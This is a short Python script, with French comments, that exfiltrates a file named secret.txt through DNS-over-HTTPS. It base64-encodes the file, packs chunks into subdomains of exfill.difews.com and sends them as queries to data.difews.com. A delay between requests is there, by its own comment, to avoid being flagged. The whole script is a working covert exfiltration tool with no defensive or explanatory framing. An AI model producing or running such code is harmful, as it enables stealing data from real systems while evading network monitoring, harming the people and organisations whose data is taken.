import base64
import requests
import time
import random
import string

DOH_SERVER = "https://data.difews.com/dns-query"  # Ou ton propre serveur DoH
DOMAIN = "exfill.difews.com"
CHUNK_SIZE = 30  # taille du chunk encodé en base64

def random_subdomain(length=5):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def encode_and_split_file(filepath):
    with open(filepath, "rb") as f:
        b64 = base64.urlsafe_b64encode(f.read()).decode()
    return [b64[i:i + CHUNK_SIZE] for i in range(0, len(b64), CHUNK_SIZE)]

def send_chunk(chunk, index, total):
    subdomain = f"{index}-{chunk}.{random_subdomain()}.{DOMAIN}"
    params = {
        "name": subdomain,
        "type": "A"
    }
    headers = {
        "accept": "application/dns-json"
    }
    try:
        r = requests.get(DOH_SERVER, params=params, headers=headers, timeout=3)
        print(f"[+] Sent chunk {index+1}/{total}: {subdomain}")
    except Exception as e:
        print(f"[-] Failed to send chunk {index+1}: {e}")

def main():
    chunks = encode_and_split_file("secret.txt")
    for i, chunk in enumerate(chunks):
        send_chunk(chunk, i, len(chunks))
        time.sleep(0.2)  # Ajout de délai pour éviter d’être flag

if __name__ == "__main__":
    main()
